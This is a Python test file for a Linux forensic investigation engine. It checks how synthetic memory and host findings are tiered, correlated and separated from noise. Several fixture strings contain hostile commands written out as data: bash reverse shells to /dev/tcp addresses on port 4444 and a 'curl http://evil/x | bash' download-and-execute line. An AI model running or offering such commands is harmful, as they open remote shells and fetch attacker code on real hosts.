"""Investigation engine lab (Linux): tests that find real issues in the
tiering/routing/correlation logic, not just confirm the happy path.

Mirrors the intent of test/windows/lab_investigation/test_investigation_lab.py:
catch FP-rate failures (noise wrongly promoted), FN-rate failures (TP wrongly
closed as noise), threshold-calibration failures, and cross-scope correlation
gaps (a pattern that spans a PID verdict and the host-scope verdict).
"""
from __future__ import annotations
import os
import sys

_REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
if _REPO not in sys.path:
    sys.path.insert(0, _REPO)

import pytest

from playbooks.linux.investigation import investigate, correlate, VerdictLabel, Dimension, Tier
from playbooks.linux.investigation.verdict import HOST_SCOPE_PID
from playbooks.linux.investigation.engine import _parse_pid_target, _TYPE_TO_MODULE, _M18_PREFIXES
from playbooks.linux.investigation.process_tree import (
    load_from_snapshot, load_from_adjudication, ancestors, descendants,
)
from playbooks.linux.investigation.chain_builder import build_chains
from playbooks.linux.investigation.ttp_patterns import match_patterns
from playbooks.linux.investigation.models.noise_filter import classify_noise


def _f(ftype, target, details='', severity='High', mitre='T1000'):
    return {'Timestamp': '2026-01-01 00:00:00', 'Severity': severity,
            'Type': ftype, 'Target': target, 'Details': details, 'MITRE': mitre}


def _verdict_for(verdicts, pid):
    for v in verdicts:
        if v.pid == pid:
            return v
    pytest.fail(f'No verdict for PID {pid}')


# ---------------------------------------------------------------------------
# PID/target parsing -- every collector's Target shape must resolve correctly
# ---------------------------------------------------------------------------

class TestPidTargetParsing:
    def test_analyze_memory_linux_shape(self):
        pid, proc = _parse_pid_target('PID 1234 (kdevtmpfsi)')
        assert (pid, proc) == (1234, 'kdevtmpfsi')

    def test_edr_hunt_shape_with_comm(self):
        pid, proc = _parse_pid_target('PID: 1234 (kdevtmpfsi)')
        assert (pid, proc) == (1234, 'kdevtmpfsi')

    def test_edr_hunt_shape_bare(self):
        pid, proc = _parse_pid_target('PID: 1234')
        assert pid == 1234

    def test_remote_access_triage_shape(self):
        pid, proc = _parse_pid_target('AnyDesk (PID 1234)')
        assert pid == 1234
        assert proc == 'AnyDesk'

    def test_host_scope_for_path_target(self):
        pid, _ = _parse_pid_target('/etc/ld.so.preload')
        assert pid == HOST_SCOPE_PID

    def test_host_scope_for_module_name_target(self):
        pid, _ = _parse_pid_target('diamorphine')
        assert pid == HOST_SCOPE_PID

    def test_host_scope_for_idt_index_target(self):
        pid, _ = _parse_pid_target('IDT[42]')
        assert pid == HOST_SCOPE_PID

    def test_pid_recovered_from_details_when_target_has_none(self):
        pid, proc = _parse_pid_target('diamorphine', 'related to PID 1234, comm=kdevtmpfsi')
        assert pid == 1234
        assert proc == 'kdevtmpfsi'


# ---------------------------------------------------------------------------
# Routing table coverage -- every real finding Type this toolkit emits must
# route somewhere (never silently dropped)
# ---------------------------------------------------------------------------

class TestRoutingCoverage:
    def test_no_type_maps_to_module_zero_in_the_static_table(self):
        """Module 0 is the safety-net fallback for genuinely unmapped types
        encountered at runtime -- nothing in the static table should point
        there deliberately."""
        assert 0 not in _TYPE_TO_MODULE.values()

    def test_known_real_world_types_all_route(self):
        sample_types = [
            'Hidden Process (memory)', 'Anonymous Exec Memory', 'Credential/Memory Access',
            'High Entropy ELF', 'Kernel core_pattern Hijack', 'Logging Service Disabled',
            'Non-standard AuthorizedKeysFile', 'PAM Module Tampering', 'Process Core Dump',
            'SSH Authorized Key', 'Shadow File World-Readable', 'Staged Credential Artifact',
            'Sudo Authentication Failure', 'Suspicious Outbound Connection',
            'Suspicious Shell History (memory)', 'Unexpected Network Listener',
            'modprobe_path Hijack', 'Unexpected SUID Binary', 'Dangerous File Capability',
        ]
        for t in sample_types:
            assert t in _TYPE_TO_MODULE, f'{t!r} not in routing table'

    def test_c2_config_dynamic_family_types_route_via_prefix(self):
        for t in ('C2 Config Recovered (Sliver)', 'BPFDoor Config Artifact (memory)',
                 'Botnet Config Recovered (memory)', 'SSH Backdoor Artifact (memory)',
                 'Cryptominer Config Recovered (memory)'):
            assert t.startswith(_M18_PREFIXES), f'{t!r} does not match any M18 prefix'

    def test_unmapped_type_still_scores_conservatively(self):
        """A finding Type with no dedicated module must never be silently
        dropped -- it should still produce a positive dimension."""
        findings = [_f('Some Brand New Finding Type Nobody Mapped Yet', 'PID 999 (x)', 'details here')]
        verdicts = investigate(findings)
        v = _verdict_for(verdicts, 999)
        assert v.positive_count >= 1


# ---------------------------------------------------------------------------
# Tiered verdict assembly
# ---------------------------------------------------------------------------

class TestVerdictAssembly:
    def test_tier1_alone_reaches_tp(self):
        """A single DEFINITIVE dimension must reach TP even with zero other
        corroboration -- e.g. Hidden Process (memory)."""
        findings = [_f('Hidden Process (memory)', 'PID 500 (x)', 'hidden from pslist')]
        v = _verdict_for(investigate(findings), 500)
        assert v.label == VerdictLabel.TRUE_POSITIVE

    def test_three_tier2_dimensions_reach_tp(self):
        findings = [
            _f('Injected Memory (malfind)', 'PID 501 (x)', 'anon exec, no backing file'),
            _f('Reverse Shell (memory)', 'PID 501', 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'),
            _f('External Connection From Untrusted Binary', 'PID: 501 (x)', 'ESTABLISHED to 1.2.3.4:4444'),
        ]
        v = _verdict_for(investigate(findings), 501)
        assert v.label == VerdictLabel.TRUE_POSITIVE
        assert v.positive_count >= 3

    def test_two_tier2_dimensions_stay_undetermined(self):
        findings = [
            _f('Injected Memory (malfind)', 'PID 502 (customtool)', 'anon exec, no backing file'),
            _f('External Connection (memory)', '203.0.113.5:443', "PID 502 ('customtool') had an external connection"),
        ]
        v = _verdict_for(investigate(findings), 502)
        assert v.label == VerdictLabel.UNDETERMINED

    def test_tier3_only_never_reaches_tp_regardless_of_count(self):
        """Capability-without-demonstrated-use dimensions can never alone
        cross the TP threshold, no matter how many accumulate."""
        findings = [
            _f('io_uring In Use (verify)', 'PID: 503 (unknownproc)', 'ring in use'),
            _f('Pinned eBPF Objects (verify)', 'PID: 503', 'pinned bpf object'),
            _f('Kallsyms Pseudo-Module (verify)', '[bpf]', 'pseudo-module tag'),
            _f('Many SSH Authorized Keys', '/home/user/.ssh/authorized_keys', '12 keys present'),
        ]
        v = _verdict_for(investigate(findings), 503)
        assert v.label != VerdictLabel.TRUE_POSITIVE

    def test_zero_positive_dims_closes_fp(self):
        findings = [_f('Process Preload', 'PID: 504', 'LD_PRELOAD set: /usr/lib/libfoo.so comm=rsyslogd')]
        v = _verdict_for(investigate(findings), 504)
        assert v.label in (VerdictLabel.FALSE_POSITIVE, VerdictLabel.NOISE_CLOSED)

    def test_yara_anon_nonexec_memory_stays_weak_not_strong(self):
        """Real bug caught live: module 12's regex ('ANONYMOUS EXECUTABLE|in ANONYMOUS')
        matched analyze_memory_linux.py's NON-executable phrasing too ("matched in
        anonymous rw- memory" legitimately contains "in anonymous"), so 19 coincidental
        rule-pack matches inside one large process's ordinary heap (non-executable, no x
        bit) got promoted to STRONG_BEHAVIORAL "code executing outside any loaded
        module" and crossed the TP threshold on rule-pack noise alone."""
        findings = [
            _f('YARA Memory Match', f'Rule_{i} :: PID 700 (code)',
              f"YARA rule 'Rule_{i}' matched in anonymous rw- memory. Matched strings: $a.")
            for i in range(19)
        ]
        v = _verdict_for(investigate(findings), 700)
        assert v.label != VerdictLabel.TRUE_POSITIVE
        assert not any(d.name == 'M12_YARA_AnonExec' for d in v.dimensions)

    def test_yara_anon_exec_memory_still_reaches_strong_tier(self):
        """The genuine signal (rule fires in ANONYMOUS EXECUTABLE memory -- injected/
        unbacked code) must still classify as STRONG_BEHAVIORAL; only the over-broad
        'in ANONYMOUS' fallback alternative was the bug, not the exec-specific match."""
        findings = [_f('YARA Memory Match', "Rule_x :: PID 701 (evil)",
                       "YARA rule 'Rule_x' matched in ANONYMOUS EXECUTABLE memory (rwx) - "
                       "injected/unbacked code.")]
        v = _verdict_for(investigate(findings), 701)
        assert any(d.name == 'M12_YARA_AnonExec' and d.tier == Tier.STRONG_BEHAVIORAL
                  for d in v.dimensions)

    def test_dedup_collapses_repeated_identical_dimension(self):
        """One behavior described by many identical findings must count as
        ONE dimension, not N -- repetition is not independence."""
        findings = [_f('Suspicious Shell History (memory)', f'PID 505 @ time{i}',
                      'Recovered shell history [x]: curl http://evil/x | bash')
                   for i in range(50)]
        v = _verdict_for(investigate(findings), 505)
        # 50 identical-rationale findings must not fabricate 50 independent dimensions
        assert len(v.dimensions) < 5


# ---------------------------------------------------------------------------
# Hidden-process volume cross-check -- a DEFINITIVE claim assumes the memory
# image's kernel symbols matched the captured kernel; that assumption can be
# wrong (see engine.py's _cross_validate_hidden_process_volume docstring).
# ---------------------------------------------------------------------------

class TestHiddenProcessVolumeCrossCheck:
    def test_single_hidden_process_stays_definitive_tp(self):
        findings = [_f('Hidden Process (memory)', 'PID 900 (x)', 'hidden from pslist')]
        v = _verdict_for(investigate(findings), 900)
        assert v.label == VerdictLabel.TRUE_POSITIVE

    def test_three_unrelated_hidden_processes_downgraded_not_auto_tp(self):
        """Real bug caught live: a kernel-symbol-mismatched analysis run flagged 7
        unrelated, mundane, short-lived utility PIDs (sh, id, ubuntu-report, an
        accessibility daemon) as 'Hidden Process' all at once -- a rootkit has no
        reason to hide processes like that. Volume alone should downgrade, not
        auto-confirm, once there's no other reason any of them would be a target."""
        findings = [_f('Hidden Process (memory)', f'PID {900+i} (util{i})', 'hidden from pslist')
                   for i in range(3)]
        verdicts = investigate(findings)
        for i in range(3):
            v = _verdict_for(verdicts, 900 + i)
            assert v.label != VerdictLabel.TRUE_POSITIVE

    def test_downgraded_hidden_process_still_corroborates_with_other_evidence(self):
        """Downgraded to STRONG_BEHAVIORAL, not discarded -- a hidden process that
        ALSO has enough other independent corroborating evidence still reaches TP
        through the normal 3-dimension accumulation path."""
        findings = [
            _f('Hidden Process (memory)', 'PID 900 (a)', 'hidden from pslist'),
            _f('Hidden Process (memory)', 'PID 901 (b)', 'hidden from pslist'),
            _f('Hidden Process (memory)', 'PID 902 (c)', 'hidden from pslist'),
            _f('External Connection From Untrusted Binary', 'PID: 900',
              'ESTABLISHED to 203.0.113.9:4444'),
            _f('Reverse Shell (memory)', 'PID 900', 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'),
        ]
        v = _verdict_for(investigate(findings), 900)
        assert v.label == VerdictLabel.TRUE_POSITIVE


# ---------------------------------------------------------------------------
# Host-scope routing (kernel/persistence/account findings with no owning PID)
# ---------------------------------------------------------------------------

class TestHostScope:
    def test_kernel_rootkit_finding_gets_host_scope_verdict(self):
        findings = [_f('Hidden Kernel Module (memory)', 'diamorphine',
                      'module in kernel structures but absent from /proc/modules')]
        v = _verdict_for(investigate(findings), HOST_SCOPE_PID)
        assert v.label == VerdictLabel.TRUE_POSITIVE
        assert v.is_host_scope

    def test_host_scope_does_not_reach_tp_from_unrelated_findings_alone(self):
        """Real bug caught live: HOST_SCOPE_PID bundles every finding with no owning
        process -- SUID baseline drift, a masquerading file, a cron job's file owner,
        a staged credential-shaped file -- purely because none of them have a PID to
        attach to, NOT because they're corroborating facts about one thread of
        activity. On a real host this promoted host-scope findings (including this
        session's own leftover test fixtures and the toolkit's own legitimate
        egress-monitor cron job) to TRUE POSITIVE purely by accumulating 3+ unrelated
        STRONG_BEHAVIORAL dimensions from different modules. Same accumulation for a
        REAL pid (test_three_tier2_dimensions_reach_tp) must stay correct -- only
        HOST_SCOPE_PID's accumulation path is disabled."""
        findings = [
            _f('Privileged Task Non-Root Binary', '/etc/cron.d/some-job', 'root cron, non-root-owned script'),
            _f('MagicByte Mismatch', '/tmp/notes.txt', "ELF magic bytes in a '.txt' file"),
            _f('Staged Credential Artifact', '/tmp/shadow.bak', 'credential-store-like file'),
        ]
        v = _verdict_for(investigate(findings), HOST_SCOPE_PID)
        assert v.label != VerdictLabel.TRUE_POSITIVE

    def test_host_scope_and_pid_scope_are_independent_verdicts(self):
        findings = [
            _f('Hidden Kernel Module (memory)', 'diamorphine', 'hidden module'),
            _f('Hidden Process (memory)', 'PID 600 (x)', 'hidden from pslist'),
        ]
        verdicts = investigate(findings)
        pids = {v.pid for v in verdicts}
        assert HOST_SCOPE_PID in pids
        assert 600 in pids
        assert len(verdicts) == 2


# ---------------------------------------------------------------------------
# Noise filter -- deterministic rules, must not close a masquerading daemon
# ---------------------------------------------------------------------------

class TestNoiseFilter:
    def test_known_daemon_expected_path_closes(self):
        is_noise, _, _ = classify_noise('sshd', '/usr/sbin/sshd', 'systemd', [])
        assert is_noise is True

    def test_known_daemon_name_wrong_path_never_closes(self):
        """A process named 'sshd' running from /tmp is a masquerade, not noise --
        the path-legitimacy check must override the known-name check."""
        is_noise, score, rationale = classify_noise('sshd', '/tmp/.hidden/sshd', 'init', [])
        assert is_noise is False
        assert score == 1.0

    def test_unknown_process_never_auto_closes(self):
        is_noise, _, _ = classify_noise('totally_unknown_binary', '/opt/vendor/app', '', [])
        assert is_noise is False

    def test_known_daemon_with_non_benign_finding_does_not_close(self):
        findings = [_f('Reverse Shell (memory)', 'PID 700 (sshd)', 'bash -i >& /dev/tcp/1.2.3.4/1')]
        is_noise, _, _ = classify_noise('sshd', '/usr/sbin/sshd', 'systemd', findings)
        assert is_noise is False


# ---------------------------------------------------------------------------
# Correlator -- merges already-common-schema sources
# ---------------------------------------------------------------------------

class TestNameSpoofingResistance:
    """A comm/loader name is attacker-controlled (prctl(PR_SET_NAME), argv[0]) --
    these tests prove a finding whose owning process is NAMED after a known-
    benign daemon/agent still counts fully toward the TP threshold. A filter
    that trusts the name alone would let an implant rename itself to suppress
    detection; these prove that blind spot does not exist."""

    def test_implant_named_after_system_daemon_still_reaches_tp(self):
        """An implant calling itself 'systemd-udevd' must not get its
        namespace-escape dimension silently downgraded out of the count."""
        findings = [
            _f('Namespace Escape (memory)', 'PID 900 (systemd-udevd)',
              'Task is containerized (own mount ns 123) but shares the HOST pid namespace.'),
            _f('Process Running Deleted Binary (memory)', 'PID 900 (systemd-udevd)',
              'Executable unlinked from disk while running: /tmp/.x/fake'),
            _f('Reverse Shell (memory)', 'PID 900', 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'),
        ]
        v = _verdict_for(investigate(findings), 900)
        assert v.label == VerdictLabel.TRUE_POSITIVE
        ns_dim = next(d for d in v.dimensions if d.name == 'M8_NamespaceEscape_Runtime')
        assert ns_dim.positive and ns_dim.tier == Tier.STRONG_BEHAVIORAL

    def test_implant_named_after_observability_agent_still_reaches_tp(self):
        """An eBPF-holding implant calling itself 'falco' must not get its
        dimension silently downgraded out of the count."""
        findings = [
            _f('eBPF Object Held By Implant', 'PID 901 (falco)', 'holds eBPF map fd'),
            _f('Process Running Deleted Binary (memory)', 'PID 901 (falco)',
              'Executable unlinked from disk while running: /tmp/.x/fake'),
            _f('External Connection From Untrusted Binary', 'PID: 901 (falco)',
              'ESTABLISHED to 203.0.113.9:4444'),
        ]
        v = _verdict_for(investigate(findings), 901)
        assert v.label == VerdictLabel.TRUE_POSITIVE
        ebpf_dim = next(d for d in v.dimensions if d.name == 'M7_eBPF_Unattributed')
        assert ebpf_dim.positive and ebpf_dim.tier == Tier.STRONG_BEHAVIORAL

    def test_ebpf_program_hiding_pattern_not_downgraded_by_agent_name(self):
        """A collector-escalated (High severity) eBPF hiding-pattern hit whose
        loader happens to be named 'cilium' must stay STRONG_BEHAVIORAL."""
        f = _f('eBPF Program (memory)', 'cilium [kprobe]',
              "Loaded eBPF program name='cilium' type='kprobe' - hides getdents", severity='High')
        from playbooks.linux.investigation.modules import ebpf_io_uring
        dims = ebpf_io_uring.investigate(f)
        assert dims[0].positive is True
        assert dims[0].tier == Tier.STRONG_BEHAVIORAL

    def test_jit_runtime_exemption_voided_by_process_name_mismatch_on_same_pid(self):
        """A process named 'python3' with anon-exec memory is normally
        exempted -- but if the SAME PID also has an independently-confirmed
        Process Name Mismatch (comm != actual backing exe), the exemption
        must not apply: the identity claim has been disproven, not assumed."""
        findings = [
            _f('Injected Memory (malfind)', 'PID 902 (python3)', 'anon exec, no backing file'),
            _f('Process Name Mismatch', 'PID: 902',
              "Reported name 'python3' does not match executable 'kdevtmpfsi' from an untrusted path."),
        ]
        pid_findings = findings
        from playbooks.linux.investigation.modules import injected_memory
        dims = injected_memory.investigate(findings[0], pid_findings=pid_findings)
        jit_disproven = next((d for d in dims if d.name == 'M3_Injected_JITIdentityDisproven'), None)
        assert jit_disproven is not None
        assert jit_disproven.positive is True

    def test_jit_runtime_exemption_applies_normally_without_disproof(self):
        """Baseline: a genuine python3 process with anon-exec and no name-
        mismatch finding on the same PID still gets the JIT exemption."""
        findings = [_f('Injected Memory (malfind)', 'PID 903 (python3)', 'anon exec, no backing file')]
        from playbooks.linux.investigation.modules import injected_memory
        dims = injected_memory.investigate(findings[0], pid_findings=findings)
        assert dims[0].name == 'M3_Injected_JITRuntime'
        assert dims[0].positive is False


class TestSharedInfrastructurePropagation:
    def test_two_suspicious_pids_sharing_endpoint_corroborate_each_other(self):
        findings = [
            _f('Injected Memory (malfind)', 'PID 1001 (a)', 'anon exec, no backing file'),
            _f('External Connection (memory)', '203.0.113.9:8443', "PID 1001 ('a') external conn"),
            _f('Injected Memory (malfind)', 'PID 1002 (b)', 'anon exec, no backing file'),
            _f('External Connection (memory)', '203.0.113.9:8443', "PID 1002 ('b') external conn"),
        ]
        verdicts = investigate(findings)
        v1001 = _verdict_for(verdicts, 1001)
        v1002 = _verdict_for(verdicts, 1002)
        assert any('SharedInfrastructure' in d.name for d in v1001.dimensions)
        assert any('SharedInfrastructure' in d.name for d in v1002.dimensions)
        # 2 independent dims (injected memory + external conn) + shared-infra
        # corroboration = 3 -> crosses the TP threshold
        assert v1001.label == VerdictLabel.TRUE_POSITIVE

    def test_clean_processes_sharing_endpoint_do_not_manufacture_suspicion(self):
        """Two entirely benign processes hitting the same external service
        (e.g. shared update endpoint) must NOT become suspicious purely from
        network coincidence -- propagation only corroborates an EXISTING lead."""
        findings = [
            _f('External Connection (memory)', '203.0.113.9:443', "PID 1003 ('a') external conn"),
            _f('External Connection (memory)', '203.0.113.9:443', "PID 1004 ('b') external conn"),
        ]
        verdicts = investigate(findings)
        v1003 = _verdict_for(verdicts, 1003)
        v1004 = _verdict_for(verdicts, 1004)
        assert not any('SharedInfrastructure' in d.name for d in v1003.dimensions)
        assert not any('SharedInfrastructure' in d.name for d in v1004.dimensions)

    def test_private_ip_endpoints_are_excluded(self):
        findings = [
            _f('Injected Memory (malfind)', 'PID 1005 (a)', 'anon exec, no backing file'),
            _f('External Connection (memory)', '10.0.0.5:8080', "PID 1005 ('a') internal conn"),
            _f('Injected Memory (malfind)', 'PID 1006 (b)', 'anon exec, no backing file'),
            _f('External Connection (memory)', '10.0.0.5:8080', "PID 1006 ('b') internal conn"),
        ]
        verdicts = investigate(findings)
        v1005 = _verdict_for(verdicts, 1005)
        assert not any('SharedInfrastructure' in d.name for d in v1005.dimensions)

    def test_single_pid_endpoint_does_not_self_corroborate(self):
        findings = [
            _f('Injected Memory (malfind)', 'PID 1007 (a)', 'anon exec, no backing file'),
            _f('External Connection (memory)', '203.0.113.20:9001', "PID 1007 ('a') external conn"),
        ]
        verdicts = investigate(findings)
        v1007 = _verdict_for(verdicts, 1007)
        assert not any('SharedInfrastructure' in d.name for d in v1007.dimensions)


class TestCorrelator:
    def test_merges_multiple_sources_into_one_verdict_per_pid(self):
        memory = [_f('Hidden Process (memory)', 'PID 800 (x)', 'hidden')]
        journal = [_f('Suspicious Cron Job', 'PID 800', 'cron entry for this pid')]
        cvs = correlate(memory, journal_findings=journal)
        cv = next(c for c in cvs if c.pid == 800)
        assert cv.label == VerdictLabel.TRUE_POSITIVE

    def test_source_tagging_reflects_origin(self):
        memory = [_f('Injected Memory (malfind)', 'PID 801 (x)', 'anon exec')]
        remote = [_f('Crypto Miner', 'PID: 801', 'miner detected')]
        cvs = correlate(memory, remote_access_findings=remote)
        cv = next(c for c in cvs if c.pid == 801)
        sources = {s.source for s in cv.signals}
        assert 'remote_access' in sources

    def test_package_integrity_lead_is_pursued_to_definitive_tp(self):
        """A modified packaged binary must reach TP even with no other
        finding on that PID -- adjudicate.py's own top-priority rule,
        pursued to closure rather than left as a 'go verify this' note."""
        memory = [_f('Suspicious Loaded Library (memory)', 'PID 802 (nginx)', 'library check')]
        adj = [{'Pid': '802', 'SubjectPath': '/usr/sbin/nginx', 'PkgOwner': 'nginx',
               'PkgModified': True, 'FileExists': True, 'PathTrust': 'Trusted-Location'}]
        cvs = correlate(memory, adjudication_entries=adj)
        cv = next(c for c in cvs if c.pid == 802)
        assert cv.label == VerdictLabel.TRUE_POSITIVE
        assert any('Tampered' in d.name for d in cv.memory_verdict.dimensions)

    def test_package_integrity_lead_closes_fp_that_would_otherwise_be_undetermined(self):
        """A confirmed package-owned, unmodified binary should push a lone
        weak-structural finding toward closure rather than stay perpetually
        UNDETERMINED with an unresolved 'verify ownership' note."""
        memory = [_f('Process Preload', 'PID: 803', 'LD_PRELOAD set: /usr/lib/libfoo.so comm=nginx')]
        adj = [{'Pid': '803', 'SubjectPath': '/usr/sbin/nginx', 'PkgOwner': 'nginx',
               'PkgModified': False, 'FileExists': True, 'PathTrust': 'Trusted-Location'}]
        cvs = correlate(memory, adjudication_entries=adj)
        cv = next(c for c in cvs if c.pid == 803)
        assert cv.label == VerdictLabel.FALSE_POSITIVE

    def test_package_integrity_lead_routes_host_scope_findings_correctly(self):
        """Most real-world findings (SUID binaries, capabilities) are HOST-
        SCOPE -- adjudicate.py leaves Pid=None for these but still resolves
        PkgOwner/PkgModified from the Target path. This must route to
        HOST_SCOPE_PID rather than being silently dropped because Pid is None."""
        host_findings = [_f('Unexpected SUID Binary', '/usr/sbin/pam_extrausers_chkpwd',
                            'SUID/SGID binary outside the base-OS baseline.', severity='Low')]
        adj = [{'Pid': None, 'SubjectPath': '/usr/sbin/pam_extrausers_chkpwd',
               'PkgOwner': 'libpam-modules-bin', 'PkgModified': False, 'FileExists': True,
               'PathTrust': 'Trusted-Location'}]
        cvs = correlate(host_findings, adjudication_entries=adj)
        host_cv = next(c for c in cvs if c.pid == 0)
        assert any('PackageIntegrity_Confirmed' in d.name for d in host_cv.memory_verdict.dimensions)

    def test_unowned_binary_in_trusted_path_is_incriminating_not_exonerating(self):
        """A path-trust heuristic alone must NOT be treated as proof of
        benignity -- an unowned file masquerading in /usr/bin is a real lead
        that should escalate, not quietly close."""
        memory = [_f('Suspicious Loaded Library (memory)', 'PID 804 (fakebin)', 'library check')]
        adj = [{'Pid': '804', 'SubjectPath': '/usr/bin/fakebin', 'PkgOwner': None,
               'PkgModified': None, 'FileExists': True, 'PathTrust': 'Trusted-Location'}]
        cvs = correlate(memory, adjudication_entries=adj)
        cv = next(c for c in cvs if c.pid == 804)
        assert any('Unowned' in d.name for d in cv.memory_verdict.dimensions if d.positive)

    def test_package_upgrade_window_closes_deleted_binary_lead(self):
        """A 'Process Running Deleted Binary' finding whose backing file no
        longer exists gets no verdict from _package_integrity_dimension
        (modified/exists can't be determined for a file that's gone) -- a
        matching package-manager-log transaction is the one signal that
        still closes deleted_binary.py's own 'verify with journalctl for an
        upgrade window' lead instead of leaving it unpursued."""
        memory = [_f('Process Running Deleted Binary (memory)', 'PID 805 (nginx)',
                     'unlinked from disk while running: /usr/sbin/nginx (deleted)')]
        adj = [{'Pid': '805', 'SubjectPath': '/usr/sbin/nginx', 'PkgOwner': 'nginx',
               'PkgModified': None, 'FileExists': False, 'PathTrust': 'Trusted-Location'}]
        journal = [{'Timestamp': '2026-07-05 10:00:00', 'Severity': 'Info',
                   'Type': 'Package Manager Transaction', 'Target': 'package nginx',
                   'Details': 'upgrade nginx 1.18.0-1 1.18.0-2 at 2026-07-05 10:00:00',
                   'MITRE': 'N/A'}]
        cvs = correlate(memory, journal_findings=journal, adjudication_entries=adj)
        cv = next(c for c in cvs if c.pid == 805)
        assert any('UpgradeWindowConfirmed' in d.name and not d.positive
                  for d in cv.memory_verdict.dimensions)
        assert cv.label == VerdictLabel.FALSE_POSITIVE

    def test_package_upgrade_window_no_match_leaves_lead_unclosed(self):
        """No matching package-manager transaction must NOT fabricate
        corroboration -- the lead stays exactly as open as before."""
        memory = [_f('Process Running Deleted Binary (memory)', 'PID 806 (nginx)',
                     'unlinked from disk while running: /usr/sbin/nginx (deleted)')]
        adj = [{'Pid': '806', 'SubjectPath': '/usr/sbin/nginx', 'PkgOwner': 'nginx',
               'PkgModified': None, 'FileExists': False, 'PathTrust': 'Trusted-Location'}]
        journal = [{'Timestamp': '2026-07-05 10:00:00', 'Severity': 'Info',
                   'Type': 'Package Manager Transaction', 'Target': 'package curl',
                   'Details': 'upgrade curl 7.81.0-1 7.81.0-2 at 2026-07-05 10:00:00',
                   'MITRE': 'N/A'}]
        cvs = correlate(memory, journal_findings=journal, adjudication_entries=adj)
        cv = next(c for c in cvs if c.pid == 806)
        assert not any('UpgradeWindowConfirmed' in d.name for d in cv.memory_verdict.dimensions)

    def test_package_manager_transaction_findings_never_scored_as_detections(self):
        """'Package Manager Transaction' is context, not a detection -- it must
        never appear as a positive M0_Unmapped dimension on the host-scope
        verdict just because it flowed through the same findings list."""
        journal = [{'Timestamp': '2026-07-05 10:00:00', 'Severity': 'Info',
                   'Type': 'Package Manager Transaction', 'Target': 'package curl',
                   'Details': 'upgrade curl 7.81.0-1 7.81.0-2 at 2026-07-05 10:00:00',
                   'MITRE': 'N/A'}]
        cvs = correlate([], journal_findings=journal)
        host_cv = next(c for c in cvs if c.pid == 0)
        assert not any(d.positive for d in host_cv.memory_verdict.dimensions)


class TestProcessLineagePropagation:
    def test_direct_parent_child_both_independently_suspicious_corroborate(self):
        findings = [
            _f('Injected Memory (malfind)', 'PID 2001 (parentproc)', 'anon exec, no backing file'),
            _f('Crypto Miner', 'PID: 2002', 'xmrig-style miner process'),
        ]
        adj = [{'Pid': '2001', 'ParentPid': None},
              {'Pid': '2002', 'ParentPid': '2001'}]
        cvs = correlate(findings, adjudication_entries=adj)
        cv2001 = next(c for c in cvs if c.pid == 2001)
        cv2002 = next(c for c in cvs if c.pid == 2002)
        assert any('ProcessLineage' in d.name for d in cv2001.memory_verdict.dimensions)
        assert any('ProcessLineage' in d.name for d in cv2002.memory_verdict.dimensions)

    def test_suspicious_parent_with_clean_child_does_not_propagate(self):
        """One side earning suspicion must NOT spread it onto an otherwise-
        clean relative -- only two INDEPENDENTLY-earned leads corroborate."""
        findings = [
            _f('Injected Memory (malfind)', 'PID 2003 (parentproc)', 'anon exec, no backing file'),
            _f('Process Preload', 'PID 2004 (childproc)',
              'LD_PRELOAD set but path not flagged writable -- weak on its own'),
        ]
        adj = [{'Pid': '2003', 'ParentPid': None},
              {'Pid': '2004', 'ParentPid': '2003'}]
        cvs = correlate(findings, adjudication_entries=adj)
        cv2004 = next(c for c in cvs if c.pid == 2004)
        assert not any('ProcessLineage' in d.name for d in cv2004.memory_verdict.dimensions)

    def test_indirect_grandparent_relationship_does_not_propagate(self):
        """Transitivity guard: A -> C -> B with A and B both independently
        suspicious but C (the direct link between them) clean must NOT
        corroborate A and B -- only a DIRECT edge counts, not the full chain."""
        findings = [
            _f('Injected Memory (malfind)', 'PID 2005 (a)', 'anon exec, no backing file'),
            _f('Process Preload', 'PID 2006 (c)',
              'LD_PRELOAD set but path not flagged writable -- weak on its own'),
            _f('Crypto Miner', 'PID: 2007', 'xmrig-style miner process'),
        ]
        adj = [{'Pid': '2005', 'ParentPid': None},
              {'Pid': '2006', 'ParentPid': '2005'},
              {'Pid': '2007', 'ParentPid': '2006'}]
        cvs = correlate(findings, adjudication_entries=adj)
        cv2005 = next(c for c in cvs if c.pid == 2005)
        cv2007 = next(c for c in cvs if c.pid == 2007)
        assert not any('ProcessLineage' in d.name for d in cv2005.memory_verdict.dimensions)
        assert not any('ProcessLineage' in d.name for d in cv2007.memory_verdict.dimensions)

    def test_no_adjudication_entries_is_a_noop(self):
        findings = [
            _f('Injected Memory (malfind)', 'PID 2008 (a)', 'anon exec, no backing file'),
            _f('Crypto Miner', 'PID: 2009', 'xmrig-style miner process'),
        ]
        cvs = correlate(findings)
        cv2008 = next(c for c in cvs if c.pid == 2008)
        assert not any('ProcessLineage' in d.name for d in cv2008.memory_verdict.dimensions)


# ---------------------------------------------------------------------------
# Chain builder + TTP patterns -- cross-scope pattern matching
# ---------------------------------------------------------------------------

class TestChainsAndTTPPatterns:
    def test_miner_rootkit_pattern_spans_host_and_pid_scope(self):
        findings = [
            _f('Hidden Kernel Module (memory)', 'diamorphine', 'hidden module'),
            _f('Process Running Deleted Binary (memory)', 'PID 900 (kdevtmpfsi)',
              'Executable unlinked from disk while running: /tmp/.x/kdevtmpfsi'),
            _f('Cryptominer Config Recovered (memory)', 'PID 900 (kdevtmpfsi)',
              'XMRig-class miner config recovered: pools=[stratum+tcp://pool:3333]'),
        ]
        cvs = correlate(findings)
        tree = load_from_adjudication([])
        chains = build_chains(cvs, tree)
        matches = match_patterns(cvs, chains=chains)
        patterns = {m.pattern for m in matches}
        assert 'miner-rootkit-deployment' in patterns

    def test_no_pattern_match_without_host_scope_half(self):
        """The miner config alone (no kernel rootkit signal) must NOT match --
        proves the matcher genuinely requires both halves, not just one."""
        findings = [
            _f('Cryptominer Config Recovered (memory)', 'PID 901 (kdevtmpfsi)',
              'XMRig-class miner config recovered: pools=[stratum+tcp://pool:3333]'),
        ]
        cvs = correlate(findings)
        matches = match_patterns(cvs, chains=None)
        assert not any(m.pattern == 'miner-rootkit-deployment' for m in matches)

    def test_fileless_beacon_pattern_same_pid(self):
        findings = [
            _f('Memory-Only Executable (memfd)', 'PID: 902 (x)', 'executing from memfd backing'),
            _f('Injected Memory (malfind)', 'PID 902 (x)', 'anon exec, no backing file'),
        ]
        cvs = correlate(findings)
